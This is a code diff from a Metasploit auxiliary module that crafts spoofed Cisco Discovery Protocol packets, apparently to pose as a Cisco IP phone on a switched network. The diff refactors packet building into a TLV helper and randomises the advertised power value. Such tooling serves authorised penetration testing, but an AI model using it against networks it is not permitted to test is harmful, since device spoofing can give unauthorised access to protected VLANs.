@@ -27,7 +27,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('SMAC', [false, "MAC Address for MAC Spoofing"]),
         OptString.new('VTPDOMAIN', [false, "VTP Domain"]),
         OptString.new('DEVICE_ID', [true, "Device ID (e.g. SIP00070EEA3156)", "SEP00070EEA3156"]),
-        OptString.new('PORT', [true, "The Switch Port", "1"]),
+        OptString.new('PORT', [true, "The CDP 'sent through interface' value", "Port 1"]),
         # XXX: this is not currently implemented
         # OptString.new('CAPABILITIES',   [false, "Capabilities of the device (e.g. Router, Host, Switch)", "Router"]),
         OptString.new('PLATFORM', [true, "Platform of the device", "Cisco IP Phone 7975"]),
@@ -170,15 +170,12 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def prep_cdp
-    # options from the user
-    device = datastore['DEVICE_ID']
-    port = datastore['PORT']
+    # device ID
+    p = tlv(1, datastore['DEVICE_ID'])
+    # port ID
+    p << tlv(3, datastore['PORT'])
     # TODO: implement this correctly
     # capabilities = datastore['CAPABILITIES'] || "Host"
-    platform = datastore['PLATFORM']
-    software = datastore['SOFTWARE']
-    vtpdomain = datastore['VTPDOMAIN'] if datastore['VTPDOMAIN']
-
     # CAPABILITIES
     # define CDP_CAP_LEVEL1          0x40
     # define CDP_CAP_FORWARD_IGMP    0x20
@@ -187,30 +184,30 @@ class Metasploit3 < Msf::Auxiliary
     # define CDP_CAP_LEVEL2_SRB      0x04
     # define CDP_CAP_LEVEL2_TRBR     0x02
     # define CDP_CAP_LEVEL3_ROUTER   0x01
+    p << tlv(4, "\x00\x00\x00\x41")
+    # software version
+    p << tlv(5, datastore['SOFTWARE'])
+    # platform
+    p << tlv(6, datastore['PLATFORM'])
+    # VTP management domain
+    p << tlv(9, datastore['VTPDOMAIN']) if datastore['VTPDOMAIN']
+    # random 1000-7000 power consumption in mW
+    p << tlv(0x10, [1000 + rand(6000)].pack('n'))
+    # duplex
+    p << tlv(0x0b, datastore['FULL_DUPLEX'] ? "\x01" : "\x00")
+    # VLAn query.  TOD: figure out this field, use tlv, make configurable
+    p << "\x00\x0F\x00\b \x02\x00\x01"
 
-    # Package Preperation
-    p  = "\x00\x01#{l(device)}#{device}"                    # Device ID
-    p << "\x00\x03#{l("Port #{port}")}Port #{port}"         # Port ID
-    p << "\x00\x04\x00\b\x00\x00\x00A"                      # Capabilities, XXX: hardcoded
-    p << "\x00\x05#{l(software)}#{software}"                # Software Version
-    p << "\x00\x06#{l(platform)}#{platform}"                # Platform
-    p << "\x00\x09#{l(vtpdomain)}#{vtpdomain}" if vtpdomain # VTP Domain Management
-    p << "\x00\x10\x00\x06\x18\x9C"                         # Power Consumption 6300 mW
-    p << "\x00\x0b\x00\x05#{datastore['FULL_DUPLEX'] ? "\x01" : "\x00"}" # Duplex
-    p << "\x00\x0F\x00\b \x02\x00\x01"                      # VLAN Query
-
-    # Header Preperation
-    version = "\x02"                                        # CDP version
-    ttl = "\xB4"                                            # TTL (180 seconds)
-    checksum = cdpchecksum(version + ttl + "\x00\x00" + p)        # CDP Checksum
-
-    version + ttl + checksum + p                                # CDP Payload
+    # VDP version
+    version = "\x02"
+    # TTL (180s)
+    ttl = "\xB4"
+    checksum = cdpchecksum(version + ttl + "\x00\x00" + p)
+    version + ttl + checksum + p
   end
 
-  def l(s, n = 2)
-    l = s.length + 4
-    l = "%0#{n * 2}X" % l
-    [l].pack('H*')
+  def tlv(t, v)
+    [ t, v.length + 4 ].pack("nn") + v
   end
 
   def cdpchecksum(p)
